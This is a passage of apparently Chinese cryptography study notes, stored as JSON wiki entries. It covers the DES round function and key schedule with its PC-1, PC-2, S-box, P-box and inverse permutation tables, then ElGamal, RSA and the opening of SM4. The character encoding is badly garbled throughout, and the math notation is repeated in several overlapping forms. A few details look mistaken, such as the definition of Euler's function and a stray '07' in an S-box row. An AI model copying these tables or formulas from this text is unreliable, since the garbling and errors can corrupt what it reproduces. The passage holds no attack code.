F(Riâˆ’1,Ki)F(R_{i-1},K_i)F(Riâˆ’1â€‹,Kiâ€‹)ï¼šç¬¬ iii è½®çš„è½®å‡½æ•°(å›¾ä¸­è™šçº¿æ¡†) âŠ•ï¼šä¸¤ä¸ªæ¯”ç‰¹ä¸²çš„å¼‚æˆ– Liâˆ’1ï¼ŒRiâˆ’1L_{i-1}ï¼ŒR_{i-1}Liâˆ’1â€‹ï¼ŒRiâˆ’1â€‹ï¼šç¬¬ iâˆ’1i-1iâˆ’1 è½®çš„å·¦ã€å³ä¸¤éƒ¨åˆ† Liï¼ŒRiL_{i}ï¼ŒR_{i}Liâ€‹ï¼ŒRiâ€‹ï¼šç¬¬iiiè½®çš„å·¦ã€å³ä¸¤éƒ¨åˆ†ï¼ˆå„32bitï¼‰ KiK_iKiâ€‹ æ˜¯ç¬¬ iii è½®ç”¨çš„å­å¯†é’¥ï¼ˆ48bitï¼‰ è½®ç»“æ„ä¸­çš„æ ¸å¿ƒæ˜¯F(Riâˆ’1,Ki)F(R_{i-1},K_i)F(Riâˆ’1â€‹,Kiâ€‹)å‡½æ•°ï¼Œå®ƒæ˜¯æ¯è½®å®ç°æ··ä¹±å’Œæ‰©æ•£çš„å…³é”®æ¨¡å—ã€‚å…¶åŸºæœ¬åŠ å¯†ç»“æ„å¦‚ä¸‹å›¾4-6æ‰€ç¤ºã€‚ F(Riâˆ’1,Ki)F(R_{i-1},K_i)F(Riâˆ’1â€‹,Kiâ€‹)å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹åŒ…æ‹¬ï¼š â€‹\tæ‰©å±•ç½®æ¢Eè¡¨ï¼šå°†è¾“å…¥çš„32bitRiâˆ’1R_{i-1}Riâˆ’1â€‹ç½®æ¢æˆ48bitï¼› â€‹\tè¿™48bitä¸å­å¯†é’¥KiK_iKiâ€‹(48bit)è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼› â€‹\tä»£æ¢é€‰æ‹©Sç›’ï¼šç»“æœè¾“å…¥Sç›’ï¼Œè¾“å‡º32bitçš„è¾“å‡º ï¼ˆè¾“å…¥ä¸º48bitï¼Œè¾“å‡ºä¸º32bitï¼‰ï¼› â€‹\tç½®æ¢Pè¡¨ï¼šæœ€åç»è¿‡Pç½®æ¢åå³ä¸ºF(Riâˆ’1,Ki)F(R_{i-1},K_i)F(Riâˆ’1â€‹,Kiâ€‹)å‡½æ•°çš„è¾“å‡ºã€‚ ï¼ˆ1ï¼‰æ‰©å±•ç½®æ¢Eè¡¨ â€‹ æ‰©å±•ç½®æ¢Eå°†32bitçš„è¾“å…¥åˆ†æˆ8ç»„ï¼Œæ¯ç»„4bitï¼Œç»ç½®æ¢Eçš„æ‰©å±•åï¼Œå˜æˆæ¯ç»„6bitè¾“å‡º æ‰©å±•åçš„ç»“æœä¸å­å¯†é’¥KiK_iKiâ€‹è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç»“æœä½œä¸ºSç›’çš„è¾“å…¥ ï¼ˆ2ï¼‰è½®å¯†é’¥KiK_iKiâ€‹ç”Ÿæˆè¿‡ç¨‹ å­å¯†é’¥K;çš„ç”Ÿæˆå¤§è‡´åˆ†æˆä¸‰ä¸ªè¿‡ç¨‹: â€‹\t1ï¼‰ç½®æ¢é€‰æ‹©PC_1 â€‹\t2ï¼‰å¾ªç¯å·¦ç§» â€‹\t3ï¼‰ç½®æ¢é€‰æ‹©PC_2 â€‹\t1ï¼‰ç½®æ¢é€‰æ‹©PC_1 â€‹ åˆå§‹å¯†é’¥Kä¸º64bitï¼Œç»è¿‡ç½®æ¢é€‰æ‹©PC_1å»æ‰å¯†é’¥ä¸­çš„8ä¸ªå¥‡å¶æ£€éªŒä½ï¼Œå¹¶å¯¹å…¶ä½™çš„56ä½æ‰“ä¹±é‡æ–°æ’åº â€‹ å°†ç½®æ¢åçš„56bitåˆ†ä¸ºå„28bitçš„å·¦C0C_0C0â€‹ã€å³D0D_0D0â€‹ä¸¤åŠã€‚ â€‹ PC1(K)=C0D0PC_1(K)=C_0D_0PC1â€‹(K)=C0â€‹D0â€‹ï¼Œå…¶ä¸­C0C_0C0â€‹ç”±PC1(K)PC_1(K)PC1â€‹(K)å‰28ä½ç»„æˆï¼ŒD0D_0D0â€‹ç”±å28ä½ç»„æˆ é€‰æ‹©ç½®æ¢PC_1 ç¬¬1åˆ— ç¬¬2åˆ— ç¬¬3åˆ— ç¬¬4åˆ— ç¬¬5åˆ— ç¬¬6åˆ— ç¬¬7åˆ— ç¬¬1è¡Œ 57 49 41 33 25 17 9 ç¬¬2è¡Œ 1 58 50 42 34 26 18 ç¬¬3è¡Œ 10 2 59 51 43 35 27 ç¬¬4è¡Œ 19 11 3 60 52 44 36 ç¬¬5è¡Œ 63 55 47 39 31 23 15 ç¬¬6è¡Œ 7 62 54 46 38 30 22 ç¬¬7è¡Œ 14 6 61 53 45 37 29 ç¬¬8è¡Œ 21 13 5 28 20 12 4 å¯†é’¥kä¸­æœ‰8ä½å¥‡å¶æ£€éªŒä½ï¼Œåˆ†åˆ«ä½äº8ï¼Œ16ï¼Œ24ï¼Œ32ï¼Œ40ï¼Œ48ï¼Œ56ï¼Œ64ä½ï¼Œå¥‡å¶æ£€éªŒä½ç”¨äºæ£€æŸ¥å¯†é’¥kåœ¨äº§ç”Ÿã€åˆ†é…åŠå­˜å‚¨è¿‡ç¨‹ä¸­å¯èƒ½å‘ç”Ÿçš„é”™è¯¯ 2ï¼‰å¾ªç¯å·¦ç§» â€‹ 1â‰¤iâ‰¤161â‰¤iâ‰¤161â‰¤iâ‰¤16ï¼ŒCi=LSi(Ciâˆ’1)C_i=LS_i(C_{i-1})Ciâ€‹=LSiâ€‹(Ciâˆ’1â€‹)ï¼ŒDi=LSi(Diâˆ’1)D_i=LS_i(D_{i-1})Diâ€‹=LSiâ€‹(Diâˆ’1â€‹)ï¼Œåœ¨ç¬¬ iii è½®åˆ†åˆ«å¯¹Ciâˆ’1C_{i-1}Ciâˆ’1â€‹å’ŒDiâˆ’1D_{i-1}Diâˆ’1â€‹è¿›è¡Œå¾ªç¯å·¦ç§»ï¼Œæ‰€ç§»ä½æ•°ä¸º iii ä½ã€‚ â€‹ ï¼ˆå½“i=1,2,9,16i=1,2, 9, 16i=1,2,9,16æ—¶ï¼Œåˆ™å·¦ç§»1ä¸ªä½ç½®ï¼Œå…¶ä½™å·¦ç§»2ä¸ªä½ç½®ã€‚å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼‰ è¿­ä»£æ¬¡æ•° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 å·¦ç§»ä½æ•° 1 1 2 2 2 2 2 2 1 2 2 2 2 2 2 1 â€‹ ç§»ä½åçš„ç»“æœä½œä¸ºæ±‚ä¸‹ä¸€è½®å­å¯†é’¥çš„è¾“å…¥ï¼ŒåŒæ—¶ä¹Ÿä½œä¸ºç½®æ¢é€‰æ‹©PC_2çš„è¾“å…¥ã€‚ â€‹ 3ï¼‰ç½®æ¢é€‰æ‹©PC_2 â€‹ Ki=PC_2(CiDi)K_i=PC\\_2(C_iD_i)Kiâ€‹=PC_2(Ciâ€‹Diâ€‹)ï¼ŒPC2PC_2PC2â€‹ä¸ºå›ºå®šç½®æ¢ï¼Œç”¨äºä»56bitçš„CiDiC_iD_iCiâ€‹Diâ€‹ä¸­é€‰å–48ä½ä½œä¸ºç¬¬ iii è½®è¿­ä»£çš„å­å¯†é’¥KiK_iKiâ€‹ â€‹ å­å¯†é’¥ä¸­KiK_iKiâ€‹ä¸­çš„å„ä½ä»å·¦åˆ°å³ä¾æ¬¡ä¸ºCiDiC_iD_iCiâ€‹Diâ€‹ä¸­çš„ç¬¬14ï¼Œ17ï¼Œâ‹¯ï¼Œ29ï¼Œ3214ï¼Œ17ï¼Œ\\cdotsï¼Œ29ï¼Œ3214ï¼Œ17ï¼Œâ‹¯ï¼Œ29ï¼Œ32ä½ é€‰æ‹©ç½®æ¢PC_2 ç¬¬1åˆ— ç¬¬2åˆ— ç¬¬3åˆ— ç¬¬4åˆ— ç¬¬5åˆ— ç¬¬6åˆ— ç¬¬1è¡Œ 14 17 11 24 1 5 ç¬¬2è¡Œ 3 28 15 6 21 10 ç¬¬3è¡Œ 23 19 12 4 26 8 ç¬¬4è¡Œ 16 7 27 20 13 2 ç¬¬5è¡Œ 41 52 31 37 47 55 ç¬¬6è¡Œ 30 40 21 45 33 48 ç¬¬7è¡Œ 44 49 39 56 34 53 ç¬¬8è¡Œ 46 42 50 36 29 32 ï¼ˆ3ï¼‰Sç›’ä»£æ¢ è¾“å…¥ä¸º48bitï¼Œç»Sç›’åè¾“å‡ºä¸º32bitï¼Œè¾“å‡ºç»“æœä¸ºPç›’ç½®æ¢çš„è¾“å…¥ã€‚ è½®å‡½æ•°ä¸­çš„ä»£æ¢ç”±8ä¸ªSç›’ç»„æˆï¼Œæ¯ä¸ªSç›’çš„è¾“å…¥é•¿ä¸º6ä½ã€è¾“å‡ºé•¿ä¸º4ä½ï¼Œ å¯¹äºSç›’ï¼Œå…¶6ä½è¾“å…¥ä¸­ï¼Œç¬¬1ä½å’Œç¬¬6ä½å½¢æˆä¸€ä¸ª2ä½äºŒè¿›åˆ¶æ•°ï¼Œç”¨æ¥é€‰æ‹©Sçš„è¡Œï¼Œä¸­é—´4ä½ç”¨æ¥é€‰æ‹©åˆ—ã€‚ è¡Œå’Œåˆ—é€‰å®šåï¼Œå¾—åˆ°å…¶äº¤å‰ä½ç½®çš„åè¿›åˆ¶æ•°ï¼Œå°†è¿™ä¸ªæ•°è¡¨ç¤ºä¸º4ä½äºŒè¿›åˆ¶æ•°å³å¾—è¿™ä¸€Sç›’çš„è¾“å‡ºã€‚ S1S_1S1â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 14 4 13 1 2 15 11 8 3 10 6 12 5 9 0 7 1 0 15 07 4 14 2 13 1 10 6 12 11 9 5 3 8 2 4 1 14 8 13 6 2 11 15 12 9 7 3 10 5 0 3 15 12 8 2 4 9 1 7 5 11 3 14 10 0 6 13 S2S_2S2â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 15 1 8 14 6 11 3 4 9 7 2 13 12 0 5 10 1 3 13 4 7 15 2 8 14 12 0 1 10 6 9 11 5 2 0 14 7 11 10 4 13 1 5 8 12 6 9 3 2 15 3 13 8 10 1 3 15 4 2 11 6 7 12 0 5 14 9 S3S_3S3â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 10 0 9 14 6 3 15 5 1 13 12 7 11 4 2 8 1 13 7 0 9 3 4 6 10 2 8 5 14 12 11 15 1 2 13 6 4 9 8 15 3 0 11 1 2 12 5 10 14 7 3 1 10 13 0 6 9 8 7 4 15 14 3 11 5 2 12 S4S_4S4â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 7 13 14 3 0 6 9 10 1 2 8 5 11 12 4 15 1 13 8 11 5 6 15 0 3 4 7 2 12 1 10 14 9 2 10 6 9 0 12 11 7 13 15 1 3 14 5 2 8 4 3 3 15 0 6 10 1 13 8 9 4 5 11 12 7 2 14 S5S_5S5â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 2 12 4 1 7 10 11 6 8 5 3 15 13 0 14 9 1 14 11 2 12 4 7 13 1 5 0 15 10 3 9 8 6 2 4 2 1 11 10 13 7 8 15 9 12 5 6 3 0 14 3 11 8 12 7 1 14 2 13 6 15 0 9 10 4 5 3 S6S_6S6â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 12 1 10 15 9 2 6 8 0 13 3 4 14 7 5 11 1 10 15 4 2 7 12 9 5 6 1 13 14 0 11 3 8 2 9 14 15 5 2 8 12 3 7 0 4 10 1 13 11 6 3 4 3 2 12 9 5 15 10 11 14 1 7 6 0 8 13 S7S_7S7â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 4 11 2 14 15 0 8 13 3 12 9 7 5 10 6 1 1 13 0 11 7 4 9 1 10 14 3 5 12 2 15 8 6 2 1 4 11 13 12 3 7 14 10 15 6 8 0 5 9 2 3 6 11 13 8 1 4 10 7 9 5 0 15 14 2 3 12 S8S_8S8â€‹ 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0 13 2 8 4 6 15 11 1 10 9 3 14 5 0 12 7 1 1 15 13 8 10 3 7 4 12 5 6 11 0 14 9 2 2 7 11 4 1 9 12 14 2 0 6 10 13 15 3 5 8 3 2 1 14 7 4 10 8 13 15 12 9 0 3 5 6 11 â€‹\tDESç®—æ³•ä¸­é™¤äº†Sç›’æ˜¯éçº¿æ€§å˜æ¢å¤–ï¼Œå…¶ä½™å˜æ¢å‡ä¸ºçº¿æ€§å˜æ¢ï¼ŒDESç®—æ³•ä¿å¯†çš„å…³é”®åœ¨äºSç›’ã€‚Sç›’æ˜¯ç»è¿‡ç²¾å¿ƒè®¾è®¡å’Œä¸¥æ ¼æŒ‘é€‰çš„ï¼Œç¾å›½å›½å®¶å®‰å…¨å±€(NSA)æ›¾å…¬å¸ƒäº†ä¸‹åˆ—å‡ æ¡è®¾ è®¡å‡†åˆ™: â—Sç›’çš„æ¯ä¸€è¡Œæ˜¯æ•´æ•°0~15çš„ä¸€ä¸ªç½®æ¢ï¼› â—æ²¡æœ‰ä¸€ä¸ªSç›’æ˜¯å®ƒè¾“å…¥å˜é‡çš„çº¿æ€§å‡½æ•°; â—æ”¹å˜Sç›’è¾“å…¥ä¸­çš„æŸ1bit, è‡³å°‘å¼•èµ·2bitçš„è¾“å‡ºå˜åŒ–; â—å¯¹ä»»ä¸€Sç›’çš„ä»»ä½•ä¸¤ ä¸ªè¾“å…¥xå’ŒxâŠ•001100ï¼Œ åˆ™å¯¹åº”çš„è¾“å‡ºè‡³å°‘æœ‰2bitä¸åŒ; â—å¯¹ä»»ä¸€Sç›’çš„ä»»ä½•ä¸¤ ä¸ªè¾“å…¥xå’ŒxâŠ•11ab00 (å…¶ä¸­a, bå±äº{0,1}), åˆ™å¯¹åº”çš„è¾“å‡ºè‡³å°‘ æœ‰2bitä¸åŒ; â—ä»»ä¸€Sç›’çš„6bitè¾“å…¥ï¼Œè‹¥æŸlbitè¾“å…¥ä¿æŒä¸å˜ï¼Œå½“å…¶å®ƒ5bitè¾“å…¥å˜åŒ–æ—¶ï¼Œåˆ™è¾“å‡ºä¸­çš„0ä¸1æ•°ç›®åˆ†å¸ƒçš„æ€»æ•°æ¥è¿‘ç›¸ç­‰ã€‚ ï¼ˆ4ï¼‰Pç›’ç½®æ¢ â€‹\tPç›’ç½®æ¢å°†Sç›’çš„32bitè¾“å‡ºé‡æ–°æ’åˆ—ï¼Œæ’åˆ—åçš„32bitå³ä¸ºå‡½æ•°F(Riâˆ’1,Ki)F(R_{i-1},K_i)F(Riâˆ’1â€‹,Kiâ€‹)çš„è¾“å‡ºã€‚ Pç›’ç½®æ¢è¡¨ ç¬¬1åˆ— ç¬¬2åˆ— ç¬¬3åˆ— ç¬¬4åˆ— ç¬¬5åˆ— ç¬¬6åˆ— ç¬¬7åˆ— ç¬¬8åˆ— ç¬¬1è¡Œ 16 7 20 21 29 12 28 17 ç¬¬2è¡Œ 1 15 23 26 5 18 31 10 ç¬¬3è¡Œ 2 8 24 14 32 27 3 9 ç¬¬4è¡Œ 19 13 30 6 22 11 4 25 3. é€†åˆå§‹ç½®æ¢IPâˆ’1é€†åˆå§‹ç½®æ¢IP^{-1}é€†åˆå§‹ç½®æ¢IPâˆ’1 DESç®—æ³•ç»è¿‡16è½®è¿­ä»£åï¼Œæœ€åä¸€æ­¥æ˜¯é€†åˆå§‹ç½®æ¢ï¼Œè¯¥ç½®æ¢IPâˆ’1IP^{-1}IPâˆ’1å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼Œå°†ç¬¬16è½®è¿­ä»£çš„è¾“å‡ºç»è¿‡é€†åˆå§‹ç½®æ¢Ip-å¤„ç†å¾—åˆ°å¯†æ–‡Cï¼Œå³ C=IPâˆ’1(R16L16)C=IP^{-1}(R_{16}L_{16}) C=IPâˆ’1(R16â€‹L16â€‹) é€†åˆå§‹ç½®æ¢IPâˆ’1IP^{-1}IPâˆ’1 ç¬¬1åˆ— ç¬¬2åˆ— ç¬¬3åˆ— ç¬¬4åˆ— ç¬¬5åˆ— ç¬¬6åˆ— ç¬¬7åˆ— ç¬¬1è¡Œ 40 8 48 16 56 24 64 32 ç¬¬2è¡Œ 39 7 47 15 55 23 63 31 ç¬¬3è¡Œ 38 6 46 14 54 22 62 30 ç¬¬4è¡Œ 37 5 45 13 53 21 61 29 ç¬¬5è¡Œ 36 4 44 12 52 20 60 28 ç¬¬6è¡Œ 35 3 43 11 51 19 59 27 ç¬¬7è¡Œ 34 2 42 10 50 18 58 26 ç¬¬8è¡Œ 33 1 41 9 49 17 57 25"},{"title":"ElGamal","path":"/wiki/cryptography/ElGamal.html","content":"å‰ç½®çŸ¥è¯† æœ¬åŸå…ƒï¼ˆã€Šæ¨æ³¢ã€‹P91ï¼‰ è‹¥gæ˜¯nçš„æœ¬åŸå…ƒç´ ï¼Œåˆ™(g,g2,â‹¯â€‰,gÏˆ(n))(g,g^2,\\cdots,g^{\\psi(n)})(g,g2,â‹¯,gÏˆ(n))åœ¨mod nä¸‹äº’ä¸ç›¸åŒä¸”éƒ½ä¸näº’ç´  ç‰¹åˆ«åœ°ï¼Œè‹¥næ˜¯ä¸€ä¸ªç´ æ•°pï¼›åˆ™(g,g2,â‹¯â€‰,gpâˆ’1)(g,g^2,\\cdots,g^{p-1})(g,g2,â‹¯,gpâˆ’1)åœ¨mod nä¸‹éƒ½ä¸ç›¸åŒ ä¾‹å­ n=19ï¼Œg=3ï¼Œ31åˆ°3183^1åˆ°3^{18}31åˆ°318åœ¨mod 19ä¸‹çš„å¹‚åˆ†åˆ«ä¸º3, 9, 8, 5, 15, 7, 2, 6, 18, 16, 10, 11, 14, 4, 12, 17, 13, 1ã€‚å³ï¼Œ3ä¸º19çš„æœ¬åŸå…ƒç´  æœ¬åŸå…ƒç´ ä¸å”¯ä¸€ï¼Œå¯éªŒè¯é™¤3å¤–ï¼Œ19çš„æœ¬åŸå…ƒç´ è¿˜æœ‰2ï¼Œ10ï¼Œ13ï¼Œ14ï¼Œ15 ElGamal ElGamalç¬”è®°è„‰ç»œ{é€‰å–å…¬å…±å‚æ•°ç¡®å®šå…¬ç§é’¥å¯¹åŠ å¯†å˜æ¢è§£å¯†å˜æ¢ElGamalç¬”è®°è„‰ç»œ\\begin{cases} é€‰å–å…¬å…±å‚æ•°\\\\ ç¡®å®šå…¬ç§é’¥å¯¹\\\\ åŠ å¯†å˜æ¢\\\\ è§£å¯†å˜æ¢ \\end{cases} ElGamalç¬”è®°è„‰ç»œâ©âªâªâªâªâ¨âªâªâªâªâ§â€‹é€‰å–å…¬å…±å‚æ•°ç¡®å®šå…¬ç§é’¥å¯¹åŠ å¯†å˜æ¢è§£å¯†å˜æ¢â€‹ é€‰å–å…¬å…±å‚æ•° é€‰æ‹©å¤§ç´ æ•°på’ŒÎ±\\alphaÎ±ï¼ˆÎ±\\alphaÎ± æ˜¯Zpâˆ—Z^*_pZpâˆ—â€‹ä¸Šçš„ä¸€ä¸ªç”Ÿæˆå…ƒï¼‰ ï¼ˆpå’ŒÎ±\\alphaÎ±å…¬å¼€ï¼‰ ç¡®å®šå…¬ç§é’¥å¯¹ â€‹\téšæœºé€‰å–æ•´æ•°dâˆˆï¼ˆ0ï¼Œpâˆ’1ï¼‰d\\in ï¼ˆ0ï¼Œp-1ï¼‰dâˆˆï¼ˆ0ï¼Œpâˆ’1ï¼‰ï¼ˆä½œä¸ºç§é’¥ï¼‰ï¼Œè®¡ç®—å…¬é’¥y=Î±dÂ modÂ py=\\alpha^d\\ mod\\ py=Î±dÂ modÂ p\tï¼ˆdæ˜¯ç§é’¥ï¼Œyæ˜¯å…¬é’¥ï¼‰ åŠ å¯†å˜æ¢ â€‹\tå¯¹äºä»»æ„æ˜æ–‡mâˆˆZpâˆ—m\\in Z^*_pmâˆˆZpâˆ—â€‹ï¼Œéšæœºé€‰å–ä¸€ä¸ªæ•´æ•°kâˆˆ(1,pâˆ’1)k\\in(1,p-1)kâˆˆ(1,pâˆ’1)ï¼Œè®¡ç®—å¯†æ–‡ (c1,c2)=(Î±kÂ modÂ p,mykÂ modÂ p)(c_1,c_2)=(\\alpha^k\\ mod\\ p,my^k\\ mod\\ p) (c1â€‹,c2â€‹)=(Î±kÂ modÂ p,mykÂ modÂ p) è§£å¯†å˜æ¢ å¯¹ä»»æ„å¯†æ–‡(c1,c2)âˆˆZpâˆ—Ã—Zpâˆ—(c_1,c_2)\\in Z^*_p\\times Z^*_p(c1â€‹,c2â€‹)âˆˆZpâˆ—â€‹Ã—Zpâˆ—â€‹ï¼Œä½¿ç”¨ç§é’¥dè¿›è¡Œè§£å¯†å¾—å‡ºæ˜æ–‡m m=c2(c1d)âˆ’1Â modÂ pm=c_2(c_1^d)^{-1}\\ mod\\ p m=c2â€‹(c1dâ€‹)âˆ’1Â modÂ p è¯æ˜å¦‚ä¸‹ï¼š å·²çŸ¥ï¼š c1=Î±kÂ modpc2=mykÂ modÂ py=Î±dÂ modÂ pc_1=\\alpha^k\\ mod p\\\\ c_2=my^k\\ mod\\ p\\\\ y=\\alpha^d\\ mod\\ p c1â€‹=Î±kÂ modpc2â€‹=mykÂ modÂ py=Î±dÂ modÂ p å¼€å§‹æ¨å¯¼ï¼š \\begin{equation}\\begin{split} c_2(c_1^d)^{-1}&amp;\\equiv my^k(\\alpha^{d\\ k}ï¼‰^{-1}\\ mod\\ p\\\\ &amp;\\equiv my^k(y^k)^{-1}\\ mod\\ p\\quadã€y^k(y^k)^{-1}çº¦æ‰ã€‘\\\\ &amp;\\equiv m\\ mod\\ p \\end{split}\\end{equation}"},{"title":"RSA","path":"/wiki/cryptography/RSA.html","content":"å‰ç½®çŸ¥è¯† æ¬§æ‹‰å‡½æ•° nï¼šä¸€æ­£æ•´æ•° Ïˆ(n)\\psi(n)Ïˆ(n)ï¼šå°äºnä¸”ä¸näº’ä¸ºç´ æ•°çš„æ­£æ•´æ•°çš„ä¸ªæ•° ç‰¹æ®Šåœ° è‹¥pä¸ºç´ æ•°ï¼Œåˆ™Ïˆï¼ˆnï¼‰\\psiï¼ˆnï¼‰Ïˆï¼ˆnï¼‰=p-1 é‚£ä¹ˆï¼Œå¯¹äºä¸¤ä¸ªç´ æ•°på’Œqï¼Œè®°å®ƒä»¬çš„ä¹˜ç§¯n=qpï¼Œåˆ™æœ‰Ïˆ(n)=(pâˆ’1)(qâˆ’1)\\psi(n)=(p-1)(q-1)Ïˆ(n)=(pâˆ’1)(qâˆ’1) ä¾‹å­ æ±‚Ïˆ(6)\\psi(6)Ïˆ(6)ã€‚æ¯”6å°ä¸”ä¸6äº’ç´ çš„æ­£æ•´æ•°æœ‰{1ï¼Œ5}ä¸¤ä¸ªï¼Œæ‰€ä»¥Ïˆ(6)=2\\psi(6)=2Ïˆ(6)=2 æ±‚Ïˆ(21)\\psi(21)Ïˆ(21)ã€‚ æ³•:1ï¼šæ¯”21å°è€Œä¸”æ¯”21äº’ç´ çš„æ­£æ•´æ•°æœ‰{1,2,4,5,8,10,11,13,16,17,19,20}å…±12ä¸ª æ³•2ï¼š21=3Ã—7ï¼ˆ3å’Œ7éƒ½æ˜¯ç´ æ•°ï¼‰ï¼Œæ‰€ä»¥Ïˆ(21)=(3âˆ’1)Ã—(7âˆ’1)=12\\psi(21)=(3-1)Ã—(7-1)=12Ïˆ(21)=(3âˆ’1)Ã—(7âˆ’1)=12 è´¹é©¬å®šç† pï¼šç´ æ•°ï¼›aï¼šæ­£æ•´æ•°ï¼›ä¸”gcdï¼ˆaï¼Œpï¼‰=1ï¼ˆå³aå’Œpäº’ç´ ï¼‰ï¼Œåˆ™apâˆ’1â‰¡1Â modÂ pa^{p-1}\\equiv1\\ mod\\ papâˆ’1â‰¡1Â modÂ p RSA RSAç¬”è®°è„‰ç»œ{å‚æ•°å®šä¹‰å’Œå¯†é’¥ç”ŸæˆåŠ å¯†ç®—æ³•è§£å¯†ç®—æ³•RSAç¬”è®°è„‰ç»œ\\begin{cases} å‚æ•°å®šä¹‰å’Œå¯†é’¥ç”Ÿæˆ\\\\ åŠ å¯†ç®—æ³•\\\\ è§£å¯†ç®—æ³• \\end{cases} RSAç¬”è®°è„‰ç»œâ©âªâªâ¨âªâªâ§â€‹å‚æ•°å®šä¹‰å’Œå¯†é’¥ç”ŸæˆåŠ å¯†ç®—æ³•è§£å¯†ç®—æ³•â€‹ 1. å‚æ•°å®šä¹‰å’Œå¯†é’¥ç”Ÿæˆ ï¼ˆ1ï¼‰é€‰ä¸¤ä¸ªå¤§ç´ æ•°på’Œqï¼›ï¼ˆpï¼Œqä¿å¯†ï¼‰ ï¼ˆ2ï¼‰è®¡ç®—n=pqï¼ŒÏˆ(n)=(pâˆ’1)Ã—(qâˆ’1)\\psi(n)=(p-1)Ã—(q-1)Ïˆ(n)=(pâˆ’1)Ã—(qâˆ’1)ï¼›ï¼ˆnå…¬å¼€ï¼ŒÏˆ(n)\\psi(n)Ïˆ(n)ä¿å¯†ï¼‰ ï¼ˆ3ï¼‰éšå³é€‰ä¸€æ•´æ•°eï¼Œè¦æ±‚æ»¡è¶³1&lt;e&lt;Ïˆ(n)1&lt;e&lt;\\psi(n)1&lt;e&lt;Ïˆ(n)ä¸”gcd(e,Ïˆ(n))=1gcd(e,\\psi(n))=1gcd(e,Ïˆ(n))=1ï¼›ï¼ˆeå…¬å¼€ï¼‰ ï¼ˆ4ï¼‰è®¡ç®—dï¼Œè¦æ±‚æ»¡è¶³eÃ—dâ‰¡1(modÏˆ(n))e\\times d\\equiv1(mod\\psi(n))eÃ—dâ‰¡1(modÏˆ(n))ï¼Œå³ dâ‰¡eâˆ’1(modÏˆ(n)) d\\equiv e^{-1}(mod\\psi(n)) dâ‰¡eâˆ’1(modÏˆ(n)) â€‹\tå› ä¸ºåœ¨ï¼ˆ3ï¼‰ä¸­é€‰eæ—¶eå°±æ˜¯è¦ä¸Ïˆ(n)\\psi(n)Ïˆ(n)äº’ç´ ï¼Œæ‰€ä»¥eçš„ä¹˜æ³•é€†å…ƒä¸€å®šå­˜åœ¨ â€‹ ï¼ˆdä¿å¯†ï¼‰ pã€qã€Ïˆ(n)\\psi(n)Ïˆ(n)å¯ä»¥é”€æ¯ï¼Œä½†ä¸èƒ½æ³„éœ² 2. åŠ å¯†ç®—æ³• åŠ å¯†æ—¶é¦–å…ˆå°†æ˜æ–‡æ¯”ç‰¹ä¸²åˆ†ç»„ï¼Œä½¿å¾—æ¯ä¸ªåˆ†ç»„å¯¹åº”çš„åè¿›åˆ¶æ•°å°äºnï¼Œå³åˆ†ç»„é•¿åº¦å°äºlog2nlog_2nlog2â€‹nï¼Œç„¶åå¯¹æ¯ä¸ªæ˜æ–‡åˆ†ç»„mï¼Œä½œåŠ å¯†è¿ç®—å¾—å¯†æ–‡c câ‰¡me(modÂ n) c\\equiv m^e(mod\\ n) câ‰¡me(modÂ n) 3. è§£å¯†ç®—æ³• å¯¹å¯†æ–‡åˆ†ç»„è¿›è¡Œè§£å¯†è¿ç®—å¾—æ˜æ–‡m mâ‰¡cd(modÂ n) m\\equiv c^d(mod\\ n) mâ‰¡cd(modÂ n)"},{"title":"SM4","path":"/wiki/cryptography/SM4.html","content":"å‚è€ƒç½‘å€ http://www.mamicode.com/info-detail-2603734.html https://blog.csdn.net/cg129054036/article/details/83016958 æ€»ä½“æµç¨‹ SM4æ˜¯å¯¹ç§°å¯†é’¥ä¸­çš„åˆ†ç»„å¯†ç  å¯†é’¥æ ‡å‡†é•¿åº¦ å’Œ åˆ†ç»„å›ºå®šé•¿åº¦ éƒ½ä¸º128bitï¼Œæ‰€ä»¥æ¯ç»„çš„è¾“å‡ºä¹Ÿä¸º128bit SM4æ˜¯å¯¹â€œå­—â€å‹å¥½çš„ç®—æ³•ï¼Œä¸€ä¸ªå­—èŠ‚é•¿åº¦ä¸º8bitï¼Œä¸€ä¸ªå­—é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯32bitã€‚SM4ç®—æ³•ä¸­ï¼Œ32bitçš„æ“ä½œéå¸¸å¤šï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†æé«˜è¿è¡Œæ•ˆç‡ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯ä¸ºäº†ä¸€æ¬¡æ€§å¤„ç†æ•´æ•°ä¸ªå­—æ—¶çš„æ–¹ä¾¿ã€‚ ä¸€äº›å‚æ•°(ä»¥ä¸‹æ¯ä¸ªå˜é‡è¡¨ç¤ºä¸€ä¸ªå­—) ä¸»å¯†é’¥(128bit)ï¼šMK=(MK0,MK1,MK2,MK3)MK=(MK_0,MK_1,MK_2,MK_3)MK=(MK0â€‹,MK1â€‹,MK2â€‹,MK3â€‹) è½®å¯†é’¥(128bit)ï¼š(rk0,rk1,â‹¯â€‰,rk31)(rk_0,rk_1,\\cdots,rk_{31})(rk0â€‹,rk1â€‹,â‹¯,rk31â€‹)ï¼Œè½®å¯†é’¥ç”±åŠ å¯†å¯†é’¥ç”Ÿæˆ ç³»ç»Ÿå‚æ•°(128bit)ï¼šFK=(FK0,FK1,FK2,FK3)FK=(FK_0,FK_1,FK_2,FK_3)FK=(FK0â€‹,FK1â€‹,FK2â€‹,FK3â€‹)ï¼Œç”¨äºå¯†é’¥æ‰©å±•ç®—æ³• 